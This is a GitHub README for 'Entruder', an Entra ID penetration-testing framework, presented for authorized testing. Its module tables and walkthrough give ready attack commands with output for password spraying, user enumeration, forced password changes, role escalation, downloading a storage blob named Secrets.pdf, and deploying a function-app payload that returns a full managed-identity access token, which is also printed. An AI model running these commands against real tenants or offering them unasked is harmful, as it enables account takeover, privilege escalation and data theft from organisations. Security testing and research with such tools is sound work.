<a id="readme-top"></a>

![python-shield]
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![project_license][license-shield]][license-url]
[![LinkedIn][linkedin-shield]][linkedin-url]


<table>
  <tr>
    <td>
      ⚠️ Entruder is for <strong>authorized
      security testing and educational purposes only</strong>. Only use it
      against tenants you own or have explicit written permission to test.
      Unauthorized use is illegal and strictly prohibited. The authors assume
      no liability for misuse.
    </td>
  </tr>
</table>
<div align="center">
  <a href="https://github.com/LGenAgul/Entruder">
    <img src="https://github.com/user-attachments/assets/c0e11cae-bf34-4f37-84b2-c1027608fd55" width="510" height="120" alt="Logo">
  </a>
  <p align="center">
    All-In-One Python Framework for Entra ID Penetration Testing
  </p>
</div>


## Table of Contents

1. [About The Project](#about-the-project)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Contributing](#contributing)
5. [Acknowledgments](#acknowledgments)


## About The Project
Entruder is a comprehensive Microsoft Entra ID Penetration Testing framework written in Python.
It serves to provide a centralized base for Entra ID based attacks and testing techniques, providing various
modules and commands used to enumerate, interact with and exploit weaknesses in a given tenant. Entruder grew out of a common
frustration with decentralized Entra ID and Azure tooling, with having to switch between Bash and PowerShell
interfaces to conduct different techniques, while having to reinput access tokens with each respective tool. Similar in concept
and structure as to how NetExec and BloodyAD function against Active Directory environments, operating on a command-subcommand system,
Entruder aims to bring the same unified approach to Microsoft Entra ID.
## Disclaimer
Entruder is intended for **authorized security testing, research, and
educational purposes only**.
This tool is designed to be used by security professionals, penetration
testers, and researchers who have **explicit, written permission** to test
the target Microsoft Entra ID tenant and associated resources. Running
Entruder against any tenant, account, or infrastructure you do not own or
have authorization to assess may be **illegal** and is strictly prohibited.
## Features
Entruder is organized into command groups, with each providing respective subcommands under a single verb. An example of this is:

entruder get tenant

where get is the verb and tenant is the subcommand.


### Module list

A full set of groups is provided below:

| Group | Purpose |
|-------|---------|
| login | Acquire and initialize sessions across every major Entra auth flow |
| enum | Enumerate identity, directory, and Azure resource objects |
| get | Retrieve a single object or piece of loot in detail |
| set | Modify directory objects, escalate, persist, and pivot |
| brute | Credential and access-control attacks (spray, user enum, MFA/CA sweeps) |
| exploit | Execute code against Azure compute resources |
| azsync | Attack Entra Connect / AD Sync hybrid-identity infrastructure |
| sharepoint | Discover and search SharePoint & OneDrive data |
| info | Local utilities used for decoding tokens, listing known clients |

<details>
<summary><b>Login Module</b></summary></br>
Used to authenticate to a tenant, acquiring an access token and storing it in the session cache. If the auth flow supports it, Entruder will automatically extract access tokens across all resource planes.

| Command | Description |
|---------|-------------|
| device | Authenticate via device code flow (v1 default, --v2 for scope-based flow) |
| authcode | Authenticate via the OAuth2 authorization code flow |
| ropc | Authenticate with username and password (Resource Owner Password Credentials) |
| secret | Authenticate as a service principal with a client ID and secret |
| cert | Authenticate as a service principal with a client certificate |
| refresh | Acquire new access tokens using a refresh token |
| foci | Abuse the Family of Client IDs to acquire a Family Refresh Token (FRT) |
| kerberos | Authenticate using a Kerberos ticket via Seamless SSO (pass-the-ticket) |
| token | Initialize a session from a previously acquired access token |

</details>

<details>
<summary><b>Enum Module</b></summary></br>
By far the bulkiest module, providing enumeration commands against most Entra ID and Azure objects.
  
| Command | Description |
|---------|-------------|
| users | Enumerate directory users via Microsoft Graph |
| groups | Enumerate directory groups via Microsoft Graph |
| sp | Enumerate service principals via Microsoft Graph |
| apps | Enumerate app registrations, requested permissions, redirect URIs, and credentials |
| roles | Enumerate tenant-wide directory role assignments — who has what role |
| privs | Enumerate the current user's privileges (requires graph + management token) |
| owned | Enumerate everything the current user owns or controls via membership |
| au | Enumerate administrative units and their delegation details |
| devices | Enumerate tenant-wide registered devices |
| cap | Enumerate Conditional Access policies |
| consents | Enumerate OAuth2 delegated permission grants (who holds what scope on whose behalf) |
| subscriptions | Enumerate subscriptions associated with the tenant |
| resources | Enumerate resources within a subscription |
| storage-accounts | Enumerate storage accounts and their exposure-relevant settings |
| containers | List containers in a storage account |
| blobs | List blobs in a container |
| keyvaults | Enumerate Key Vaults in a subscription and their settings |
| secrets | List secret names/metadata in a vault |
| keys | List key names/metadata in a vault |
| certificates | List certificate names/metadata in a vault |
| webapps | Enumerate App Service web apps and their exposure-relevant settings |
| webapp-slots | Enumerate a web app's deployment slots (each a full site in its own right) |
| funcapps | Enumerate function apps in a subscription |
| automation-accounts | Enumerate Automation Accounts in a subscription |
| runbooks | List runbooks in an Automation Account |
| automation-variables | List variables in an Automation Account |

</details>

<details>
<summary><b>Get Module</b></summary></br>
Provides commands for retrieving a single specific object or piece of loot, with more detail than the enum module.

| Command | Description |
|---------|-------------|
| user | Query a specific user in detail (more than enum users) |
| group | Fetch a single group by object ID or display name |
| app | Fetch a single application or service principal by object ID |
| tenant | Fetch a tenant's identity/federation info by domain |
| token | Acquire token(s) from the host's Managed Identity via the IMDS endpoint |
| mail | Fetch a single email's full content (subject, sender, recipients, body, attachments) |
| file | Download a file from SharePoint or OneDrive by drive item ID |
| blob | Retrieve a single blob's content |
| keyvault | Fetch a single Key Vault's ARM properties by name |
| secret-value | Retrieve a secret's actual value |
| runbook-content | Retrieve a runbook's script content (may hide credentials) |

</details>

<details>
<summary><b>Set Module</b></summary></br>
Provides commands for modifying objects and their attributes. Primarily used for post-exploitation, escalation, and persistence.

| Command | Description |
|---------|-------------|
| password | Change a user's password |
| owner | Add a user as owner of an application or service principal |
| group-member | Add a user to a group |
| role-member | Add a user to a directory role |
| app-role | Assign an app role to a user or service principal |
| app-secret | Add a client secret to an application (auth as that app's service principal) |

</details>

<details>
<summary><b>Brute Module</b></summary></br>
This module packs commands for brute-force and password-guessing attacks against the tenant.
  
| Command | Description |
|---------|-------------|
| users | Discover valid Entra ID users from a wordlist |
| pwspray | Spray password(s) against a list of userPrincipalNames |
| mfasweep | Authenticate across numerous planes to check for missing MFA enforcement |
| uasweep | Authenticate with a range of User-Agent strings to find Conditional Access gaps |
| blobs | Brute-force container names against a storage account and check for public listing |

</details>
<details>
<summary><b>Exploit Module</b></summary></br>
The exploit module provides techniques for exploiting Azure compute resources, mainly to achieve code execution and extract Managed Identity access tokens.
  
| Command | Description |
|---------|-------------|
| runbook | Create, publish, and run a malicious runbook to execute code |
| funcapp | Deploy and trigger malicious function app content to execute code |
| kudu | Execute system commands via a web app's Kudu instance |

</details>

<details>
<summary><b>Azsync Module</b></summary></br>
The azsync module contains commands for exploiting Microsoft Entra Connect (Azure AD Connect) deployments in a tenant.
  
| Command | Description |
|---------|-------------|
| users | Enumerate directory users synced from on-prem AD via Entra Connect |
| extract | Pull ADSync configuration from an MSSQL database hosting an Entra Connect install |
| ato | Take over a target account (e.g. Global Admin) by abusing on-prem sync (MSOL) credentials |

</details>

<details>
<summary><b>Sharepoint Module</b></summary></br>
The sharepoint module contains commands for interacting with and retrieving SharePoint and OneDrive objects in a tenant.
  
| Command | Description |
|---------|-------------|
| sites | Enumerate SharePoint sites visible to the session via the Microsoft Search API |
| files | Search file names/content across every visible SharePoint site and OneDrive drive |

</details>
<details>
<summary><b>Info Module</b></summary></br>
The info module provides general tool information and offline analysis commands.
  
| Command | Description |
|---------|-------------|
| token | Decode and analyze a JWT (UPN, directory roles, display name, etc.) |
| clients | List well-known Microsoft first-party client IDs the tool recognizes |

</details>

<p align="right">(<a href="#readme-top">back to top</a>)</p>
## Installation
You can clone the repository and use the tool via python3.10+
```bash
git clone https://github.com/LGenAgul/Entruder
cd Entruder
pip install -e .
entruder --help
```
Or download a compiled binary from releases if you don't want Python.

## Usage
Entruder is built around a session model. Within the tool, you authenticate once, and the resulting tokens are cached, reused and refreshed automatically by every subsequent command.
You provide the tenant and client Ids as parameters on your initial login, for example:
```bash
$ entruder login ropc -t <TENANT_ID> -c <CLIENT_ID> -u <EMAIL> -p <PASSWORD>
```
Upon a successful authentication flow, the access tokens are saved, with the last given tenant and client Ids cached in separate file aswell.
From hereon you just run commands and Entruder selects the appropriate access token needed.
```bash
$ entruder [GLOBAL OPTIONS] <MODULE> <COMMAND> [OPTIONS]
```
### Global options

These apply to every command and are passed before the group name:

| Option | Description |
|--------|-------------|
|--color / --no-color |	Enable colored output (default: no color) |
|-v, --verbose |	Show full tracebacks for internal errors |
|-n, --no-progress	| Disable the live progress spinner for multi-call commands |

### Help
Every module and command has its own respective `--help` document. Not specifying any arguments also defaults to a help output
```bash
# top-level groups and global options
entruder --help
# all enum subcommands               
entruder enum --help
# options for a specific command          
entruder login device --help
 # no arguments, prints the enum help too
entruder enum                 
```
### The session model
The first authentication is the only time you supply the tenant and client. For the few commands that need a specific client ID, Entruder automatically selects the right one for you.
```bash
entruder login device -t <TENANT_ID> -c <CLIENT_ID>
```
`-t` and `-c` are cached on first explicit use, so later commands need no re-authentication and no token juggling:
```bash
 # reuses the cached Graph session
entruder enum users
# reuses the cached Management session           
entruder enum subscriptions
# inspect what's cached across every plane    
entruder info token            
```
Need a known first-party Client ID to authenticate with? List the ones Entruder recognizes.
```bash
$ entruder info clients
[...]
Client ID  : cb1056e2-e479-49de-ae31-7812af012ed8
App Name   : Microsoft Azure Active Directory Connect
Resolve As : aadconnect

Client ID  : 04b07795-8ddb-461a-bbee-02f9e1bf7b46
App Name   : Microsoft Azure CLI
Resolve As : azure_cli, azurecli

Client ID  : 1950a258-227b-4e31-a9cf-717495945fc2
App Name   : Microsoft Azure PowerShell
Resolve As : azure_powershell, azurepowershell
[...]
```
You can also pass a given alias instead of the Client ID explicitly.
```bash
entruder login ropc -t <TENANT_ID> -c azurecli
```
<p align="right">(<a href="#readme-top">back to top</a>)</p>

## Examples

<table>
  <tr>
    <td>
      ⚠️ The examples below are either placeholders or were ran against my own private tenant
    </td>
  </tr>
</table>

### Basic Engagement via Entruder
#### Get a Tenant ID from a domain
The testing flow generally begins by enumerating the Tenant ID from their domain name, this can be done in Entruder through:
```bash
entruder get tenant -d <DOMAIN_NAME>
```
<img width="1034" height="287" alt="image" src="https://github.com/user-attachments/assets/e3a4451c-d7fe-43b1-a82a-06f9e50cf972" />

#### Discovering valid users via a wordlist
After getting the tenant we can use the brute module with a predefined wordlist to discover valid users
```bash
entruder brute users -d <DOMAIN_NAME> -l <PATH_TO_WORDLIST>
```
<img width="804" height="199" alt="image" src="https://github.com/user-attachments/assets/ade197d4-f735-495c-8f8f-5a44ed0dcdcf" />

#### Password Spraying
After discovering valid users we can spray a password list across them using brute pwspray
```bash
entruder brute pwspray -u <USER_LIST> --passwords <PASSWORD_LIST> -t <TENANT_ID> -c <CLIENT_ID>
```
In the below example we can see that a valid password is discovered, with no MFA enforcement.
<img width="1646" height="177" alt="image" src="https://github.com/user-attachments/assets/edc56517-f1bd-4599-81a0-842f49fa5816" />

#### Login
Now with a set of valid credentials we can authenticate to relevant resource planes and retrieve an access token for each, they will be stored in a session file in `/home/<USER>/.entruder/sessions/`
```bash
entruder login ropc -t <CLIENT_ID> -c <CLIENT_ID> -u '<UPN>' -p '<PASSWORD>'
```
```bash
$ entruder login ropc -t 7a930b37-b80e-4c65-a674-9bffa7b7a42a -c azurecli -u testuser@satesto2026outlook.onmicrosoft.com -p 'EntruderIsTheTool123!'

[+] Graph Token acquired successfully!
[+] Management Token acquired successfully!
[+] Storage Token acquired successfully!
[+] Keyvault Token acquired successfully!
[+] Session saved for tenant: 7a930b37-b80e-4c65-a674-9bffa7b7a42a

```

#### Tenant Enumeration
We can begin enumeration by getting a list of subscriptions, an example below shows a single subscription with its respective id, which will be used as an argument in further commands
```bash
entruder enum subscriptions
```
<img width="777" height="525" alt="image" src="https://github.com/user-attachments/assets/c8188a1c-f7a7-46e6-a78c-eae725615d6c" />

#### Privilege Enumeration
We can enumerate the user's tenant-wide privileges including their group memberships, directory roles and owned objects with Entruder
```bash
entruder enum privs -s <SUBSCRIPTION_ID>
```
<img width="2044" height="398" alt="image" src="https://github.com/user-attachments/assets/ad061c3b-e4bd-499a-874c-dfe871d83142" />
The output shows that our user possesses the "Global Administrator" role which means they possess the highest privileges inside the tenant.

### User Enumeration
Entruder can be used to enumerate all users in the tenant
```bash
entruder enum users
```
<img width="1018" height="373" alt="image" src="https://github.com/user-attachments/assets/b7f831c8-19da-4b75-b296-c3b5e1e65f56" />


### Modifying objects
Entruder can be used to modify attributes, add group members, change passwords, add role assignments, and conduct other tenant-wide write operations
#### Modifying a users password
```bash
$ entruder set password -u <TARGET_UPN> -p <NEW_PASSWORD>
```
```bash
$ entruder set password -u jtest@satesto2026outlook.onmicrosoft.com -p 'ChangedPassword123!'
[+] Password for abfc890f-7d22-40... successfully changed to ChangedPassword123!
```
#### Adding an ARM RBAC role assignment to our user
```bash
entruder set arm-role -rg rg-1 -res Microsoft.Storage/storageAccounts/beststorageintheworld -s 3e8cfe1d-4e52-4beb-8679-4eda267cc128  -u jtest@satesto2026outlook.onmicrosoft.com -r contributor

[+] Successfully assigned contributor to abfc890f-7d22-406d-bf79-300a6d82f4b5 on resource Microsoft.Storage/storageAccounts/beststorageintheworld
```
### Elevating Privileges in the ARM plane from Global Administrator
You can use Entruder with a Global Administrator Account to elevate their ARM privileges to User Access Administrator, so that you access all ARM resources
```bash
entruder exploit elevate
```
```bash
$ entruder exploit elevate

[+] Global Administrator successfully elevated to User Access Administrator
[!] Re-authenticate to refresh your token before running Azure resource commands
```
### Enumerating Resources
Entruder provides command to enumerate and intract with ARM resources
```bash
entruder enum resources -s <SUBSCRIPTION_ID>
```
```bash
entruder enum resources -s 3e8cfe1d-4e52-4beb-8679-4eda267cc128                              

[
  {
    "id": "/subscriptions/3e8cfe1d-4e52-4beb-8679-4eda267cc128/resourceGroups/rg-1/providers/Microsoft.Storage/storageAccounts/beststorageintheworld",
    "name": "beststorageintheworld",
    "type": "Microsoft.Storage/storageAccounts",
    "sku": {
      "name": "Standard_LRS",
      "tier": "Standard"
    },
    "kind": "StorageV2",
    "location": "italynorth",
    "tags": {}
  },
[...]
```
For example we can target the "beststorageintheworld" storage account to get its containers
#### Enumerating containers in a storage account
```bash
entruder enum containers -a <STORAGE_ACCOUNT_NAME>
```
```bash
entruder enum containers -a beststorageintheworld

Containers in beststorageintheworld
Name                : secretscontainer
Public Access       : N/A
Last Modified       : Thu, 03 Sep 2026 07:46:50 GMT
Lease Status        : unlocked
Lease State         : available
Immutability Policy : false
Legal Hold          : false
1 containers total
```
#### Enumerating blobs in a container
```bash
entruder enum blobs -a beststorageintheworld -n secretscontainer
Blobs in beststorageintheworld/secretscontainer
Name          : Secrets.pdf
Content Type  : application/pdf
Size (bytes)  : 648841
Last Modified : Thu, 03 Sep 2026 07:46:53 GMT
Blob Type     : BlockBlob
Access Tier   : Hot
Lease Status  : unlocked
Etag          : 0x8DF098F859694A8
1 blobs total
```
And Finally we can download the blob directly
```bash
entruder.py get blob -a beststorageintheworld -n secretscontainer -b Secrets.pdf > secrets.pdf
```

### Compute Exploitation
Entruder can be used to abuse compute resources via "Contributor" role assigned users to execute code and extract managed identity tokens, an example of this would be Function Apps.
```bash
$ entruder exploit funcapp \
  -t 7a930b37-b80e-4c65-a674-9bffa7b7a42a \
  -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46 \
  -s 3e8cfe1d-4e52-4beb-8679-4eda267cc128 \
  -rg bacho_group  -f bacho -i -r graph \
  -H bacho-bngzcya8arafeubv.canadacentral-01.azurewebsites.net

[+] SCM basic auth enabled
https://bacho-bngzcya8arafeubv.scm.canadacentral-01.azurewebsites.net
[*] Deploying python payload to bacho...
202
"c61b62c4-f339-4074-9857-46b08272341b"
[+] Payload deployed successfully
[*] Waiting for function to initialise...
[*] Invoking function...
[+] Output:
{"access_token": 
"eyJ0eXAiOiJKV1QiLCJub25jZSI6Ikh4cmJzQnQ3aWgycE1WMDU2N0s3cnRqMkJTNS11YTN6TU15aE1URnd3eTQiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQ1aDQwcTdHMHg0OXFuNDFsTTkta0tqcEQ5OCIsImtpZCI6IlQ1aDQwcTdHMHg0OXFuNDFsTTkta0tqcEQ5OCJ9.e
yJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvN2E5MzBiMzctYjgwZS00YzY1LWE2NzQtOWJmZmE3YjdhNDJhLyIsImlhdCI6MTc4ODExNzY2NSwibmJmIjoxNzg4MTE3NjY1LCJleHAiOjE3ODgyMDQz
NjUsImFjcnMiOlsicGZkciJdLCJhaW8iOiJBU1FBMi84Y0FBQUFLYm0wdFFkWlQ1SkxTSUhZdCtCRjZlMENPNXRRSmZaMzdhNEt3aUVrbFBjPSIsImFwcF9kaXNwbGF5bmFtZSI6ImJhY2hvIiwiYXBwaWQiOiI5NTk2YTIwYi1mOTk3LTRhMWYtOTllYS1jMDQ1ZTBlZjZkNzE
iLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC83YTkzMGIzNy1iODBlLTRjNjUtYTY3NC05YmZmYTdiN2E0MmEvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiJkMWI3MTVlZS0wOGUyLTRlNjEtYjY4Yi02NjFkODBiZTcxYjgiLCJyaCI6IjEuQV
hvQU53dVRlZzY0WlV5bWRKdl9wN2VrS2dNQUFBQUFBQUFBd0FBQUFBQUFBQUFBQUFCNkFBLiIsInN1YiI6ImQxYjcxNWVlLTA4ZTItNGU2MS1iNjhiLTY2MWQ4MGJlNzFiOCIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjdhOTMwYjM3LWI4MGUtNGM2NS1hN
jc0LTliZmZhN2I3YTQyYSIsInV0aSI6ImJSdnBLTFZBcGtlRENkbGF4NnV6QUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWN0X2ZjdCI6IjkgMyIsInhtc19mdGQiOiJrcTNfUkF1cnNxUDlxV0Rs
X2pxZUxvNUlzRzlyS2pFbHNvb3FPNkxkOEc0QlkyRnVZV1JoWTJWdWRISmhiQzFrYzIxeiIsInhtc19pZHJlbCI6IjcgOCIsInhtc19wZnRleHAiOiIxNzg4MjkwNzY1IiwieG1zX3JkIjoiMC40MkxsWUJKaXJCSVM0ZUFVRXBnV0h2aDgyLW1wUGszUFhDemJ4SUxZaEVRNE9
JUUVtQmtnNEFDVUZoTGg0QllTNE5qUXZINExYX2pTaU9PSzFpNnR6YklBIiwieG1zX3N1Yl9mY3QiOiIzIDkiLCJ4bXNfdGNkdCI6IjE3ODgwMzAxNDMiLCJ4bXNfdG50X2ZjdCI6IjMgMiJ9.XQnKiR2Eh07SnQvEykRysEsJNUBY3tZ-rhvWKfA2Op2yQjCuCN2RdrYY1vvbu
6sEY0BST5Ama1WLOIIORS-xjayuboiQugqVWE1GcaxinkoiaDYoLlpcmwQBO42ps4tK39yuHpIpx-qKq_cz1dE-l7aQIT-qV6aB6a3REiqvoljLkTX8xA_ZzWq_lZ6Kd20268Obn8iAnNmTHsOu2-OcgbfNLOwOVZ4mqugCnJ5_feFsuVfz6jgCav-G_ZoYTp3omQIgy3osAbwq
BJ-ee7kTVXZLqAoFDeXShS5vYBo8nGDIQsdnukB8coAAd6TR5C9G9fuodcEoQgGs8n0V3_F8PA", "expires_on": "1788204364", "resource": "https://graph.microsoft.com/", "token_type": "Bearer", "client_id": 
"9596a20b-f997-4a1f-99ea-c045e0ef6d71"}
```

## Acknowledgements
This tool was built upon techniques and research offered by the following 
projects. Kudos to their creators for the outstanding work:
- **[AADInternals](https://github.com/Gerenios/AADInternals)** by Dr. Nestori Syynimaa - the foundational reference 
  for Entra ID attack techniques, particularly the Azure AD Connect 
  hybrid attack chain and WS-Trust authentication flows
- **[ROADtools](https://github.com/dirkjanm/ROADtools)** by Dirk-jan Mollema - architecture reference for 
  Python-native Entra ID tooling and token handling
- **[GraphRunner](https://github.com/dafthack/GraphRunner)** by Beau Bullock - reference for Microsoft Search 
  API enumeration techniques and FOCI token abuse
- **[Impacket](https://github.com/fortra/impacket)** by Fortra - DPAPI and MSSQL client implementation 
  used in the azsync module
- **[MicroBurst](https://github.com/NetSPI/MicroBurst)** by NetSPI - Azure resource enumeration techniques
- **[PowerZure](https://github.com/hausec/PowerZure)** by hausec - Azure exploitation technique reference

## Requirements
All dependencies are installed automatically via `pip install -e .`

| Package | Purpose |
|---------|---------|
| `httpx` | HTTP client for all API requests |
| `typer` | CLI framework |
| `rich` | Terminal output formatting |
| `msal` | Microsoft Authentication Library (device flow, cert auth) |
| `impacket` | DPAPI decryption and MSSQL client (azsync module) |
| `cryptography` | Certificate-based authentication |
| `jsonschema` | Session file validation |
| `requests` | MSAL dependency |

### Optional: Kerberos authentication

The `login kerberos` command requires additional system packages:

**Linux/macOS:**
```bash
# Debian/Ubuntu
sudo apt install libkrb5-dev
pip install gssapi

# macOS
brew install krb5
pip install gssapi
```

**Windows:**
```bash
pip install winkerberos
```

### Pre-built binaries

If you prefer not to manage Python dependencies, pre-built binaries for 
Linux, macOS, and Windows are available in the 
[releases](https://github.com/LGenAgul/Entruder/releases) page — 
no Python installation required.

## Contributing
Contributions are welcome. If you have a technique, module, or a general improvement 
you'd like to add, feel free to open a pull request or an issue.

### Guidelines

- Follow the existing module structure with each command living in its own file 
  under the appropriate module folder
- Use the `@handle_cli_errors` decorator on all commands
- Add a `vprint` call before every HTTP request
- Include a clear docstring on every command describing what it does and what token/permissions it requires
- Test your changes against a live tenant before submitting

### Adding a new module

If you're adding an entirely new module group:

1. Create a folder under `entruder/modules/<module_name>/`
2. Add `__init__.py` exporting the Typer app
3. Add `_shared.py` with the app definition and shared imports
4. Register the app in `entruder/cli.py`

### Reporting issues

Open a GitHub issue with:
- The command you ran (redact any sensitive values)
- The error or unexpected output
- Your Python version and OS

[python-shield]: https://img.shields.io/badge/python-3.10+-blue.svg?style=for-the-badge
[contributors-shield]: https://img.shields.io/github/contributors/LGenAgul/Entruder.svg?style=for-the-badge
[contributors-url]: https://github.com/LGenAgul/Entruder/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/LGenAgul/Entruder.svg?style=for-the-badge
[forks-url]: https://github.com/LGenAgul/Entruder/network/members
[stars-shield]: https://img.shields.io/github/stars/LGenAgul/Entruder.svg?style=for-the-badge
[stars-url]: https://github.com/LGenAgul/Entruder/stargazers
[issues-shield]: https://img.shields.io/github/issues/LGenAgul/Entruder.svg?style=for-the-badge
[issues-url]: https://github.com/LGenAgul/Entruder/issues
[license-shield]: https://img.shields.io/github/license/LGenAgul/Entruder.svg?style=for-the-badge
[license-url]: https://github.com/LGenAgul/Entruder/blob/main/LICENSE
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://www.linkedin.com/in/mate-agulashvili-968248183/
